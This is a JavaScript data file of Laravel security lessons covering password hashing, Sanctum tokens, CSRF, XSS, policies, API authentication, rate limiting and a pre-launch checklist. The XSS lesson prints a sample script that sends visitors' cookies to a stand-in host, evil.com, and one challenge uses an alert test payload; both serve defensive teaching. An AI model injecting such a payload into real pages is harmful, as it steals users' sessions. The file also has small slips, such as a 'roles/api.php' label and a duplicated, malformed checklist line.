/* ========================================
   Chango — Backend Roadmap · Level 07: Authentication & Security (8 lessons)
   ======================================== */

Object.assign(LESSONS, {

  'security-hashing': {
    id: 'security-hashing',
    section: 'Authentication & Security',
    level: '07',
    title: 'Password Hashing',
    time: '30 min',
    difficulty: 'Advanced',
    book: 'Book Chapter 7 · Hashing',

    intro: 'Storing passwords in plain text is the developer version of leaving your front door unlocked with a neon sign that says "free Wi-Fi". Hashing turns that password into a fingerprint: one-way, unique, and impossible to unwrap.',

    whyMatters: 'Data breaches happen to companies bigger than yours. When your database leaks, the ONLY thing between your users\' accounts and the internet is whether passwords were hashed. It is not optional hardening — it is the minimum bar of being a professional.',

    explanation: [
      { tag: 'heading', text: 'Hash vs encryption' },
      { tag: 'text', text: '<strong>Encryption</strong> is reversible (it has a key). <strong>Hashing</strong> is one-way: you can compute a hash from a password, but you cannot get the password back from the hash. That is exactly what you want — you never need to "read" a password, only check if a guess matches its hash.' },
      { tag: 'heading', text: 'Why bcrypt / argon' },
      { tag: 'text', text: 'Fast hashes like MD5 or SHA-1 are useless for passwords — attackers can compute them billions of times per second. <strong>bcrypt</strong> and <strong>argon2</strong> are deliberately slow and salted. Slowness is a feature: it delays every guessing attempt.' },
      { tag: 'heading', text: 'Never roll your own' },
      { tag: 'text', text: 'Writing a "custom hashing algorithm" is a rite of passage into the hall of shame. Use the framework\'s battle-tested implementation. Laravel has <span class="inline-code">Hash::make()</span> and <span class="inline-code">Hash::check()</span>, with bcrypt as the default — it adds a random salt per password automatically.' }
    ],

    code: [
      {
        lang: 'php',
        label: 'Hashing a password',
        code: 'use Illuminate\\Support\\Facades\\Hash;\n' +
              '\n' +
              '$user = User::create([\n' +
              '    "name" => $request->name,\n' +
              '    "email" => $request->email,\n' +
              '    "password" => Hash::make($request->password),\n' +
              ']);'
      },
      {
        lang: 'php',
        label: 'Verifying during login',
        code: 'if (Hash::check($request->password, $user->password)) {\n' +
              '    // correct password\n' +
              '} else {\n' +
              '    // wrong password\n' +
              '}'
      }
    ],

    codeExplained: [
      { tag: 'text', text: '<span class="inline-code">Hash::make()</span> hashes with a fresh random salt each call — so the same password hashes differently every time, and two users with identical passwords never get identical hashes. <span class="inline-code">Hash::check()</span> re-hashes the guess and compares safely.' }
    ],

    mistakes: [
      'Storing plain-text passwords. There is no excuse, no project too small, no "I will fix it later".',
      'Hashing with MD5/SHA-1 because "it\'s built into PHP". It is also built into every GPU attacker\'s toolset.',
      'Rolling your own algorithm "to be extra secure". Extra something, yes. Secure, no.'
    ],

    proTip: 'Laravel auth recognizes past hashes: if a user logs in with a hash algorithm you have since upgraded, <span class="inline-code">Hash::check</span> keeps working and you can rehash with <span class="inline-code">needsRehash()</span>. Sweep stale hashes to newer algorithms for free during login.',

    quiz: {
      cat: 'Hashing',
      question: 'Why is bcrypt preferred over MD5 for passwords?',
      options: [
        'bcrypt is deliberately slow and salted, which makes guessing infeasible',
        'MD5 is too slow to use',
        'bcrypt is reversible, MD5 is not',
        'There is no difference'
      ],
      correct: 0,
      feedback: { correct: 'Correct. Deliberate slowness + salts = brute force is not worth the electricity.', wrong: 'Nope. bcrypt is intentionally slow and salted. MD5 is instant, which is exactly why it is unsafe for passwords.' }
    },

    challenge: {
      lang: 'php',
      text: 'Using tinker or a quick script: hash "super_secret_123" twice and observe the two hashes differ. Then Hash::check() a correct guess and an incorrect one. Confirm the correct one returns true.',
      code: 'use Illuminate\\Support\\Facades\\Hash;\n\n$h1 = Hash::make("super_secret_123");\n$h2 = Hash::make("super_secret_123");\n// compare $h1, $h2, and Hash::check()',
      hint: 'Same input, different hash — that\'s the salt doing its job.'
    ,
      solution: "$h1 = Hash::make(\"super_secret_123\");\n$h2 = Hash::make(\"super_secret_123\");\n\n$h1 !== $h2;                     // true — same input, different salt\nHash::check(\"super_secret_123\", $h1);   // true\nHash::check(\"wrong_password\", $h1);     // false"},

    prev: { slug: 'api-search', title: 'Filtering & Search' },
    next: { slug: 'security-sanctum', title: 'Sanctum Tokens' }
  },

  'security-sanctum': {
    id: 'security-sanctum',
    section: 'Authentication & Security',
    level: '07',
    title: 'Sanctum Tokens',
    time: '40 min',
    difficulty: 'Advanced',
    book: 'Book Chapter 7 · Sanctum',

    intro: 'Laravel Sanctum hands your mobile app, React frontend, and future third-party developer a magic ticket: a token. Present it, get in. Losing one is like losing a backstage pass — revocable, but annoying.',

    whyMatters: 'Because APIs are stateless. The server does not remember you between requests; a token proves who you are on every single call. Sanctum is Laravel\'s official, simple way to issue and revoke those tokens for single-page apps and mobile apps alike.',

    explanation: [
      { tag: 'heading', text: 'How a token works' },
      { tag: 'text', text: 'Client calls <span class="inline-code">POST /api/login</span> → server verifies the password → issues a token (a long random string) → client stores it → client sends <span class="inline-code">Authorization: Bearer &lt;token&gt;</span> on every protected request. Token dies when the user logs out or you revoke it.' },
      { tag: 'heading', text: 'Installing Sanctum' },
      { tag: 'text', text: '<span class="inline-code">composer require laravel/sanctum</span>, publish its migration, run it, and add the <span class="inline-code">HasApiTokens</span> trait to your User model. That is the whole setup — Laravel handles issuing, checking, and revoking.' },
      { tag: 'heading', text: 'Abilities: tokens with a job' },
      { tag: 'text', text: 'You can give a token capabilities: <span class="inline-code">$user->createToken("mobile", ["posts:read"])</span>. A read-only token can\'t post even if the request comes from the user. Abilities turn tokens from "all access" into "scoped access".' }
    ],

    code: [
      {
        lang: 'php',
        label: 'Issue a token on login',
        code: 'public function login(Request $request)\n' +
              '{\n' +
              '    $request->validate([\n' +
              '        "email" => "required|email",\n' +
              '        "password" => "required",\n' +
              '    ]);\n' +
              '\n' +
              '    $user = User::where("email", $request->email)->first();\n' +
              '\n' +
              '    if (! $user || ! Hash::check($request->password, $user->password)) {\n' +
              '        throw ValidationException::withMessages([\n' +
              '            "email" => ["The provided credentials are incorrect."],\n' +
              '        ]);\n' +
              '    }\n' +
              '\n' +
              '    $token = $user->createToken("client")->plainTextToken;\n' +
              '\n' +
              '    return response()->json([\n' +
              '        "token" => $token,\n' +
              '        "user" => new UserResource($user),\n' +
              '    ]);\n' +
              '}'
      }
    ],

    codeExplained: [
      { tag: 'text', text: 'Verify credentials with Hash::check — never compare to a stored plain string. If they match, <span class="inline-code">createToken</span> returns a token instance, and <span class="inline-code">plainTextToken</span> is the string you hand to the client. (Note: the plain text is only visible once — keep it out of logs.)' }
    ],

    mistakes: [
      'Generating a token but storing the plain text token in the database — Laravel hashes it for you; do not undo that.',
      'Using the same token for everything instead of abilities. Scope tokens to what the client actually does.',
      'Logging or echoing tokens. They are exactly as sensitive as passwords.'
    ],

    proTip: 'Name your tokens by client ("ios-app", "vendor-x") so when one leaks or a tester abuses it, you can revoke just that one: <span class="inline-code">$user->tokens()->where("name", "ios-app")->delete()</span>.',

    quiz: {
      cat: 'Sanctum',
      question: 'How does the client prove who they are on every API request?',
      options: [
        'By sending the token in the Authorization: Bearer header',
        'By sending the password every time',
        'By sending the session cookie only',
        'By repeating the login request'
      ],
      correct: 0,
      feedback: { correct: 'Correct. Bearer token in the Authorization header on each request.', wrong: 'Nope. The token goes in the Authorization: Bearer header on every protected request.' }
    },

    challenge: {
      lang: 'php',
      text: 'Set up Sanctum, add HasApiTokens to User, build a login route that returns a token, protect an apiResource posts route with auth:sanctum, and confirm in Postman that a request without the Bearer header gets 401.',
      hint: 'routes/api.php middleware: Route::apiResource("posts", ...)->middleware("auth:sanctum");'
    ,
      solution: "composer require laravel/sanctum\nphp artisan vendor:publish --provider=\"Laravel\\Sanctum\\SanctumServiceProvider\"\n\n// User model: use HasApiTokens;\n\n// login route returns a plain-text token:\nRoute::post(\"/login\", function (Request $request) {\n    $user = User::where(\"email\", $request->email)->first();\n    // check password with Hash::check...\n    return response()->json([\n        \"token\" => $user->createToken(\"web\")->plainTextToken,\n    ]);\n});\n\n// protected resource:\nRoute::apiResource(\"posts\", PostController::class)->middleware(\"auth:sanctum\");\n\n// Postman WITHOUT the Bearer header → 401. With it → 200.",
      solutionLang: "php"},

    prev: { slug: 'security-hashing', title: 'Password Hashing' },
    next: { slug: 'security-csrf', title: 'CSRF Protection' }
  },

  'security-csrf': {
    id: 'security-csrf',
    section: 'Authentication & Security',
    level: '07',
    title: 'CSRF Protection',
    time: '30 min',
    difficulty: 'Intermediate',
    book: 'Book Chapter 7 · CSRF',

    intro: 'CSRF is the attack where a malicious site tricks your logged-in browser into doing things in <em>your</em> session — changing a password, transferring money — without you knowing. Your browser is a willing assistant; the attacker just writes the request.',

    whyMatters: 'Any site that uses cookies or sessions for auth can be CSRF-victimized. Laravel applies CSRF protection to every state-changing web route and gives you <span class="inline-code">@csrf</span> to opt in properly. For APIs it is a different story — and that is exactly what you need to understand.',

    explanation: [
      { tag: 'heading', text: 'The attack, in pictures' },
      { tag: 'text', text: 'You log in to banking.com. Your browser holds a session cookie. You visit evil.com in another tab. Evil\'s page submits a form to banking.com/transfer with amount=999. Your browser happily sends the cookie — the server sees a legit-looking logged-in request. No user intent anywhere.' },
      { tag: 'heading', text: 'How Laravel defends web routes' },
      { tag: 'text', text: 'Laravel embeds a secret <span class="inline-code">_token</span> in your forms (via <span class="inline-code">@csrf</span>). The middleware <span class="inline-code">VerifyCsrfToken</span> rejects requests lacking a valid token. Evil.com doesn\'t know your token, so its forged form fails.' },
      { tag: 'heading', text: 'Why APIs are exempt' },
      { tag: 'text', text: 'API requests from frontends use Bearer tokens, not cookies, so CSRF does not apply the same way — the attacker cannot attach your token. Laravel disables CSRF for <span class="inline-code">routes/api.php</span> automatically. That is correct, not lazy.' }
    ],

    code: [
      {
        lang: 'html',
        label: 'A Laravel form, correctly protected',
        code: '<form method="POST" action="/profile/password">\n' +
              "  @csrf\n" +
              '  <input type="password" name="password">\n' +
              '  <button>Save</button>\n' +
              '</form>'
      }
    ],

    codeExplained: [
      { tag: 'text', text: '<span class="inline-code">@csrf</span> renders a hidden input carrying the session\'s CSRF token. On submit, Laravel compares it to the one bound to the session. Mismatch → 419 Your session has expired. That is the protective wall working.' }
    ],

    mistakes: [
      'Forgetting <span class="inline-code">@csrf</span> in a form and getting mysterious 419 errors every submit.',
      'Disabling CSRF globally "to make it work" — you just removed the wall. If an AJAX request hits it, send the token, don\'t remove the check.',
      'Assuming APIs never need it and then building cookie-based auth without a POST/GET ratio — think through which auth each route uses.'
    ],

    proTip: 'For your own Laravel API served at a different domain, keep CSRF off but use tokens + CORS config. For same-site cookie-based auth, keep CSRF on and send the XSRF-TOKEN cookie as a header via JS with <span class="inline-code">withCredentials</span>.',

    quiz: {
      cat: 'CSRF',
      question: 'Your web form keeps returning 419. What did you most likely forget?',
      options: [
        'The @csrf token field in the form',
        'The closing </form> tag',
        'A password confirmation field',
        'The method="POST" attribute'
      ],
      correct: 0,
      feedback: { correct: 'Correct. 419 = CSRF token missing or stale. Add @csrf and try again.', wrong: 'Nope. A 419 after submit almost always means the CSRF token is missing (forgot @csrf) — not a broken HTML tag.' }
    },

    challenge: {
      lang: 'text',
      text: 'Explain in three sentences to a junior dev why evil.com cannot complete a forged POST to your Laravel web app, and for your API app why CSRF is not needed on /api routes that use Bearer tokens.',
      hint: 'Mention the session-bound token that evil.com cannot read, and the difference between cookie auth and token auth.'
    ,
      solution: "1) The web app embeds a random token in the session, and every POST form must send it.\n2) evil.com cannot read that token — it lives in the victim's session cookie, which the\n   same-origin policy keeps out of evil.com's reach, so the forged POST arrives tokenless.\n3) API tokens aren't cookies the browser auto-sends: the client explicitly attaches the\n   Bearer token, so a cross-site form cannot attach it — and /api routes are safe without CSRF.",
      solutionLang: "text"},

    prev: { slug: 'security-sanctum', title: 'Sanctum Tokens' },
    next: { slug: 'security-xss', title: 'XSS Prevention' }
  },

  'security-xss': {
    id: 'security-xss',
    section: 'Authentication & Security',
    level: '07',
    title: 'XSS Prevention',
    time: '30 min',
    difficulty: 'Intermediate',
    book: 'Book Chapter 7 · XSS',

    intro: 'XSS (Cross-Site Scripting) is when your website happily displays a snippet of JavaScript that some stranger typed — and that stranger then runs code as if your site wrote it. It is the "you let me in" attack.',

    whyMatters: 'Every text field that is rendered back to a page is a potential XSS door: comments, usernames, bio fields. A crafted payload can steal cookies, fake the login form, or silently mine crypto in your visitors\' browsers. Escaping is not optional — it is the law of rendering.',

    explanation: [
      { tag: 'heading', text: 'The classic attack' },
      { tag: 'text', text: 'User posts a comment containing <span class="inline-code">&lt;script&gt;fetch("https://evil.com/?c="+document.cookie)&lt;/script&gt;</span>. If you echo it unescaped, every visitor\'s browser executes it and their session cookies fly to the attacker.' },
      { tag: 'heading', text: 'The defense is at output time, not input' },
      { tag: 'text', text: 'Never try to "clean" input by removing scripts — attackers rotate encodings faster than you patch blocks. Instead, escape on output: turn <span class="inline-code">&lt;</span> into <span class="inline-code">&amp;lt;</span> so the browser displays it as text instead of parsing it as a tag.' },
      { tag: 'heading', text: 'Blade already does this' },
      { tag: 'text', text: 'Laravel Blade\'s <span class="inline-code">{{ $comment }}</span> escapes HTML automatically. The double moustache is your friend. The single <span class="inline-code">{!! $comment !!}</span> does NOT escape — only use it when the data is genuinely trusted HTML you control.' }
    ],

    code: [
      {
        lang: 'html',
        label: 'Blade: safe vs risky',
        code: '{{ $userComment }}   {{-- escaped — safe, shows text as text --}}\n' +
              '{!! $userComment !!}  {{-- NOT escaped — XSS door if user-controlled --}}\n' +
              '\n' +
              '{{-- Formatting without swallowing the tag: --}}\n' +
              '<p>{{ $userComment }}</p>'
      }
    ],

    codeExplained: [
      { tag: 'text', text: '<span class="inline-code">{{ }}</span> is escaped by default. Reach for <span class="inline-code">{!! !!}</span> only when you personally generate the HTML (like a rich-text editor where you already sanitized server-side with an HTML purifier library).' }
    ],

    mistakes: [
      'Using <span class="inline-code">{!! !!}</span> for user text "because the text has formatting". Escaping was the point.',
      'Sanitizing input instead of escaping output — the two are different levels of safety.',
      'Assuming an API is immune. An API stores user content; anywhere it gets rendered as HTML (even an admin dashboard) is an XSS surface.'
    ],

    proTip: 'If you must render rich text, sanitize server-side with a battle-tested library (like HTMLPurifier) at output time and never let users inject <script>, event attributes, or javascript: URLs unfiltered.',

    quiz: {
      cat: 'XSS',
      question: 'Which Blade syntax renders user text safely?',
      options: [
        '{{ $text }}',
        '{!! $text !!}',
        '<?= $text ?>',
        '@{ $text }'
      ],
      correct: 0,
      feedback: { correct: 'Correct. Double moustache escapes HTML — single braces do not.', wrong: 'Nope. {{ }} escapes; the exclamation-mark version {!! !!} deliberately skips escaping.' }
    },

    challenge: {
      lang: 'blade',
      text: 'A comments feed displays a user field named $userComment. Render it safely. Then, in a browser test, post this payload and confirm your page shows the literal text instead of executing it:',
      code: '<script>alert("pwned")</script>\n\n// render it in your Blade template safely:',
      hint: '{{ $userComment }} — that\'s it. Escaping is the whole defense here.'
    ,
      solution: "// comments feed, Blade:\n<div class=\"comment\">{{ $userComment }}</div>\n\n// payload posted: <script>alert(\"pwned\")</script>\n// rendered on the page: &lt;script&gt;alert(\"pwned\")&lt;/script&gt;\n// The user sees the literal text and nothing executes.",
      solutionLang: "blade"},

    prev: { slug: 'security-csrf', title: 'CSRF Protection' },
    next: { slug: 'security-roles', title: 'Roles & Policies' }
  },

  'security-roles': {
    id: 'security-roles',
    section: 'Authentication & Security',
    level: '07',
    title: 'Roles & Policies',
    time: '35 min',
    difficulty: 'Advanced',
    book: 'Book Chapter 7 · Roles',

    intro: '"So the admin can delete any post, but a normal user can only delete their own." Congratulations — you just described authorization. Roles say who you are; policies say what exactly you may do. Both are job requirements.',

    whyMatters: 'Authentication proves identity; <strong>authorization</strong> checks whether that identity is allowed. An app where every logged-in user can do everything is a train wreck in slow motion. Roles + policies keep it sane and auditable.',

    explanation: [
      { tag: 'heading', text: 'Roles vs abilities' },
      { tag: 'text', text: '<strong>Roles</strong> are coarse buckets (admin, editor, user). <strong>Policies</strong> are precise, per-model rules ("can update this post only if you own it"). Real apps use both: roles for bulk access, policies for fine-grained checks.' },
      { tag: 'heading', text: 'The classic role setup in Laravel' },
      { tag: 'text', text: 'You can do lightweight roles with a <span class="inline-code">role</span> column ("admin"/"user"), or a proper many-to-many <span class="inline-code">roles</span> table via <span class="inline-code">$user->roles</span>. Start with the column, graduate to the table when it hurts. Either way, the check is the same: a helper like <span class="inline-code">$user->isAdmin()</span>.' },
      { tag: 'heading', text: 'Policies turn questions into gates' },
      { tag: 'text', text: 'Run <span class="inline-code">php artisan make:policy PostPolicy</span>, write <span class="inline-code">update</span> and <span class="inline-code">delete</span> methods. Then <span class="inline-code">$this->authorize("update", $post)</span> in the controller, or <span class="inline-code">->can("update", $post)</span> in Blade, or <span class="inline-code">@can</span> in user management. One rule, enforced everywhere.'
      }
    ],

    code: [
      {
        lang: 'php',
        label: 'App\\Policies\\PostPolicy',
        code: 'use App\\Models\\User;\n' +
              'use App\\Models\\Post;\n' +
              '\n' +
              'public function update(User $user, Post $post): bool\n' +
              '{\n' +
              '    return $user->isAdmin() || $user->id === $post->user_id;\n' +
              '}\n' +
              '\n' +
              'public function delete(User $user, Post $post): bool\n' +
              '{\n' +
              '    return $user->isAdmin() || $user->id === $post->user_id;\n' +
              '}'
      }
    ],

    codeExplained: [
      { tag: 'text', text: 'The policy receives the authenticated user and the model in question. Return true to allow, false to deny. Centralizing "who can do what to this post" here means the check lives in exactly one file and every controller/Blade/API route reads the same truth.' }
    ],

    mistakes: [
      'Checking only "is logged in" everywhere and letting users edit other people\'s rows.',
      'Duplicating the ownership check inside every controller method instead of a policy — one copy drifts, the app leaks.',
      'Giving every token the "admin" ability "for now" — abilities should be the least necessary for the job.'
    ],

    proTip: 'Use <span class="inline-code">Gate::before()</span> to grant admins a blanket pass once, then write only the fine-grained rules. Less code, fewer "why did admin get blocked?" tickets.',

    quiz: {
      cat: 'Authorization',
      question: 'A user should be able to delete only posts they authored. Where should that rule live?',
      options: [
        'In a PostPolicy method that compares ownership',
        'Inside the delete route URL',
        'In the frontend JavaScript',
        'Nowhere — any logged-in user may delete anything'
      ],
      correct: 0,
      feedback: { correct: 'Correct. A policy is the single home for "who may do what to this model".', wrong: 'Nope. The rule belongs in a server-side policy, not the URL or the frontend. Client-side checks are decoration, not security.' }
    },

    challenge: {
      lang: 'php',
      text: 'Create a <strong>CommentPolicy</strong> that lets a user update/delete only their own comments (or if the user is an admin), generate it with artisan, and call authorize("delete", $comment) inside the destroy method of your CommentController.',
      hint: 'php artisan make:policy CommentPolicy --model=Comment; return $user->isAdmin() || $user->id === $comment->user_id;'
    ,
      solution: "php artisan make:policy CommentPolicy --model=Comment\n\npublic function update(User $user, Comment $comment)\n{\n    return $user->isAdmin() || $user->id === $comment->user_id;\n}\n\npublic function delete(User $user, Comment $comment)\n{\n    return $user->isAdmin() || $user->id === $comment->user_id;\n}\n\n// CommentController@destroy\npublic function destroy(Comment $comment)\n{\n    $this->authorize(\"delete\", $comment);\n    $comment->delete();\n    return back();\n}"},

    prev: { slug: 'security-xss', title: 'XSS Prevention' },
    next: { slug: 'security-api-auth', title: 'API Authentication' }
  },

  'security-api-auth': {
    id: 'security-api-auth',
    section: 'Authentication & Security',
    level: '07',
    title: 'API Authentication',
    time: '40 min',
    difficulty: 'Advanced',
    book: 'Book Chapter 7 · API Auth',

    intro: 'Protecting web routes is half the job. An API out in the wild gets hit by scripts, scrapers, and the occasional curious bot within minutes of existing. API auth is how you say "friends only" at the door.',

    whyMatters: 'Your API is a public door. Without authentication, anyone can read private data, create junk records, or empty your database. With it, you know exactly who called, when, and with which token. Every serious backend locks this down before lunch.',

    explanation: [
      { tag: 'heading', text: 'The protect-all default' },
      { tag: 'text', text: 'Apply <span class="inline-code">auth:sanctum</span> middleware to everything by default, then open only what must be public (registration, login, maybe public post listings). Lock-first, unlock-rarely beats open-first, patch-in-hindsight.'
      },
      { tag: 'heading', text: 'Two kinds of routes' },
      { tag: 'text', text: '<strong>Public routes</strong>: register, login, and anything you genuinely must serve without a token. Everything else is <strong>protected</strong>: it requires a valid Bearer token. Group your route file so the split is visually obvious.' },
      { tag: 'heading', text: 'Don\'t reinvent the auth' },
      { tag: 'text', text: 'For APIs, avoid session/cookie auth — mobile apps and SPAs need stateless token auth. Sanctum covers it. If you ever need OAuth-style third-party logins, Laravel Passport and Fortify exist. Choose a tool, don\'t hand-roll one.' }
    ],

    code: [
      {
        lang: 'php',
        label: 'roles/api.php — public vs protected, at a glance',
        code: '// ---- Public ----\n' +
              'Route::post("/register", [AuthController::class, "register"]);\n' +
              'Route::post("/login", [AuthController::class, "login"]);\n' +
              '\n' +
              '// ---- Protected (must be authenticated) ----\n' +
              'Route::middleware("auth:sanctum")->group(function () {\n' +
              '    Route::get("/me", [AuthController::class, "me"]);\n' +
              '    Route::post("/logout", [AuthController::class, "logout"]);\n' +
              '    Route::apiResource("posts", PostController::class);\n' +
              '});'
      }
    ],

    codeExplained: [
      { tag: 'text', text: 'The <span class="inline-code">middleware("auth:sanctum")</span> group protects everything inside. Requests without a valid Bearer token get 401 automatically. <span class="inline-code">/me</span> returns the authenticated user; <span class="inline-code">/logout</span> revokes the current token.' }
    ],

    mistakes: [
      'Leaving CRUD routes public "temporarily" during development — "temporarily" is how breaches ship.',
      'Putting auth logic only in the frontend. Anyone can open devtools and call your API directly.',
      'Using the users table to check tokens by hand when Sanctum does it with one middleware.'
    ],

    proTip: 'On logout, delete the token server-side (<span class="inline-code">$request->user()->currentAccessToken()->delete()</span>). A client that "logged out" should hold a dead token, not an until-expiry golden ticket.',

    quiz: {
      cat: 'API Auth',
      question: 'A request without a token hits a route inside middleware("auth:sanctum"). What happens?',
      options: [
        'It gets a 401 Unauthenticated response',
        'It succeeds with an empty body',
        'It redirects to the login page',
        'The server crashes'
      ],
      correct: 0,
      feedback: { correct: 'Correct. 401, cleanly, without even running the controller. That\'s the middleware\'s whole job.', wrong: 'Nope. Sanctum\'s middleware rejects the request with 401 before the controller runs.' }
    },

    challenge: {
      lang: 'php',
      text: 'Restructure your api.php so only /register and /login are public, and everything else (me, logout, posts API resource) sits behind auth:sanctum. Then confirm in Postman: login, use the token, hit /me (200), and hit /me with no token (401).',
      hint: 'Wrapping the protected block in a middleware group is the whole trick.'
    ,
      solution: "// routes/api.php\nRoute::post(\"/register\", [AuthController::class, \"register\"]);\nRoute::post(\"/login\", [AuthController::class, \"login\"]);\n\nRoute::middleware(\"auth:sanctum\")->group(function () {\n    Route::get(\"/me\", [AuthController::class, \"me\"]);\n    Route::post(\"/logout\", [AuthController::class, \"logout\"]);\n    Route::apiResource(\"posts\", PostController::class);\n});\n\n// Postman flow: POST /login → copy token →\n// GET /me with Authorization: Bearer <token> → 200\n// GET /me with no token → 401",
      solutionLang: "php"},

    prev: { slug: 'security-roles', title: 'Roles & Policies' },
    next: { slug: 'security-rate-limit', title: 'Rate Limiting' }
  },

  'security-rate-limit': {
    id: 'security-rate-limit',
    section: 'Authentication & Security',
    level: '07',
    title: 'Rate Limiting',
    time: '30 min',
    difficulty: 'Advanced',
    book: 'Book Chapter 7 · Rate Limits',

    intro: 'Rate limiting is the bouncer at the club: one request per second, VIP gets more. It stops brute-force password guessing, scraper spam, and the "oops, I wrote an infinite loop" moment from taking your server down.',

    whyMatters: 'Without rate limits, your login route is a password-guessing lottery, and your search endpoint is an accidental DDoS tool. Laravel ships <span class="inline-code">throttle</span> middleware and the elegant <span class="inline-code">RateLimiter</span> to enforce sane budgets with one line.',

    explanation: [
      { tag: 'heading', text: 'How it works' },
      { tag: 'text', text: 'The limiter counts requests from an identifier (IP or user id) against a budget like "60 per minute". Over budget? It responds <span class="inline-code">429 Too Many Requests</span> with a Retry-After header. Under budget? Pass.' },
      { tag: 'heading', text: 'Laravel\'s throttle middleware' },
      { tag: 'text', text: '<span class="inline-code">->middleware("throttle:6,1")</span> allows 6 requests per minute. For APIs, apply stricter limits to auth endpoints (login, register) and looser ones to read-only endpoints. Attackers never get to try a thousand passwords.' },
      { tag: 'heading', text: 'Named rate limits' },
      { tag: 'text', text: 'Define named limiters in <span class="inline-code">AppServiceProvider</span> (e.g., <span class="inline-code">RateLimiter::for("login", ...)</span>) and reference them by name. They remain tweakable in one place and reuse the same "try again later" logic.'
      }
    ],

    code: [
      {
        lang: 'php',
        label: 'Throttle a fragile route',
        code: 'Route::middleware("throttle:5,1")->post("/login", [AuthController::class, "login"]);\n' +
              '\n' +
              '// or a named limiter, reusable everywhere:\n' +
              'RateLimiter::for("login", function (Request $request) {\n' +
              '    return Limit::perMinute(5)->by($request->user()?->id ?: $request->ip());\n' +
              '});'
      }
    ],

    codeExplained: [
      { tag: 'text', text: '<span class="inline-code">throttle:5,1</span> = 5 attempts per minute per user/IP. The named limiter does the same but keys on the logged-in user id when present, so one device flooding with different IPs still gets throttled.' }
    ],

    mistakes: [
      'Applying no limit to login — giving attackers an unlimited password permutation machine.',
      'Applying the same limit to every route — a busy public feed dies to the same budget as the login form.',
      'Forgetting to return Retry-After, leaving clients to guess when they may try again.'
    ],

    proTip: 'Give logged-in users larger budgets than guests (key by user id). Legitimate bots crawl your API; you want to stop the noisy anonymous ones first.',

    quiz: {
      cat: 'Rate Limiting',
      question: 'What status code does Laravel return when a request exceeds the rate limit?',
      options: [
        '429 Too Many Requests',
        '403 Forbidden',
        '500 Internal Server Error',
        '201 Created'
      ],
      correct: 0,
      feedback: { correct: 'Correct. 429, plus a Retry-After hint. That\'s the universal "slow down".', wrong: 'Nope. A throttled request gets 429 Too Many Requests.' }
    },

    challenge: {
      lang: 'php',
      text: 'Protect the /login route so that after 5 failed-or-not attempts per minute, the client must wait. Then fire 8 rapid login requests in Postman and confirm requests 6-8 come back 429.',
      hint: 'middleware("throttle:5,1") on the login route is all it takes.'
    ,
      solution: "// routes/api.php\nRoute::post(\"/login\", [AuthController::class, \"login\"])\n    ->middleware(\"throttle:5,1\");\n\n// Postman: fire 8 rapid requests →\n// requests 1–5 → 200/422, requests 6–8 → 429 Too Many Requests",
      solutionLang: "php"},

    prev: { slug: 'security-api-auth', title: 'API Authentication' },
    next: { slug: 'security-checklist', title: 'Security Checklist' }
  },

  'security-checklist': {
    id: 'security-checklist',
    section: 'Authentication & Security',
    level: '07',
    title: 'Security Checklist',
    time: '25 min',
    difficulty: 'Advanced',
    book: 'Book Chapter 7 · Checklist',

    intro: 'Nailed the hashing. Trust the sanctum. But security is not one lock — it is the habit of checking every door before you walk away. Here is the checklist smart backends run before going live.',

    whyMatters: 'Most breaches are not exotic attacks. They are the same five mistakes: plain passwords, public dev keys, debug mode on production, unbounded inputs, and unguarded admin routes. A checklist turns competence into consistency.',

    explanation: [
      { tag: 'heading', text: 'Before you deploy, run this list' },
      { tag: 'text', text: '<strong>1.</strong> APP_DEBUG=false in production (else your stack traces leak secrets). <strong>2.</strong> Fresh APP_KEY. <strong>3.</strong> .env out of version control and listed in .gitignore. <strong>4.</strong> Passwords hashed (bcrypt), no seeds with "password123". <strong>5.</strong> All admin routes behind auth + role checks.' },
      { tag: 'heading', text: 'Input & output hygiene' },
      { tag: 'text', text: 'Validate every request (Laravel validation is free). Escape every user-visible output. Rate-limit auth endpoints. Cap file uploads by size and type. Bind SQL via the query builder, never concatenation.' },
      { tag: 'heading', text: 'Keep it maintained' },
      { tag: 'text', text: 'Run <span class="inline-code">composer audit</span> and update dependencies — most real CVEs are patched, and attackers know it. Rotate tokens you suspect leaked. And when a check says "we can secure this later" — write the ticket now, because later is where websites die.'
      }
    ],

    code: [
      {
        lang: 'bash',
        label: 'The 60-second pre-launch scan',
        code: 'php artisan about            # app, env, cache status\n' +
              'composer audit               # known vulnerable packages\n' +
              'php artisan config:clear     # never ship a stale cached env\n' +
              'grep -r "APP_DEBUG=true" .env # should be false in production'
      }
    ],

    codeExplained: [
      { tag: 'text', text: 'These four commands catch the most embarrassing production failures. <span class="inline-code">composer audit</span> lists packages with known vulnerabilities — treat it like a door you must close before opening for business.' }
    ],

    mistakes: [
      'Shipping with APP_DEBUG=true because "it was easier to debug" — your .env and database credentials now print on every error page.',
      'Committing .env to the repo — one push away from a public credential leak that people scrape within minutes.',
      'Security as a "later" task. Later is not in the roadmap of attackers.'
    ],

    proTip: 'Put runbooks in your repo: a SECURITY.md or deploy checklist. When you get paged at 3am, you want a checklist, not archaeology through your own memory.',

    quiz: {
      cat: 'Security',
      question: 'Why is APP_DEBUG=true dangerous in production?',
      options: [
        'Stack traces can leak paths, code, and environment secrets to visitors',
        'It prevents all validation',
        'It disables the database',
        'It is perfectly safe, just slower'
      ],
      correct: 0,
      feedback: { correct: 'Correct. Debug mode is a spy who shows strangers your secrets.', wrong: 'Nope. Debug mode prints detailed errors — full of file paths, queries, and environment values — to anyone who trips an exception.' }
    },

    challenge: {
      lang: 'bash',
      text: 'Run the pre-launch scan commands on a project locally. Fix what they catch: set APP_DEBUG=false (only in a copy meant to mirror prod), ensure .env is gitignored, and run composer audit. Note every finding.',
      hint: 'composer audit may need `composer update` first if it reports nothing useful. git check-ignore .env confirms it is ignored.'
    ,
      solution: "grep -n \"APP_DEBUG\" .env         # must be APP_DEBUG=false in the prod copy\ngit check-ignore .env            # echoes .env → it is ignored, good\ncomposer audit                   # fix every reported package\ncomposer audit            (run from the repo — report what it found)\n\nRemaining findings to note:\n- old packages flagged by composer audit → scheduled a composer update\n- .env confirmed ignored before push",
      solutionLang: "bash"},

    prev: { slug: 'security-rate-limit', title: 'Rate Limiting' },
    next: { slug: 'linux-terminal', title: 'The Terminal' }
  }

});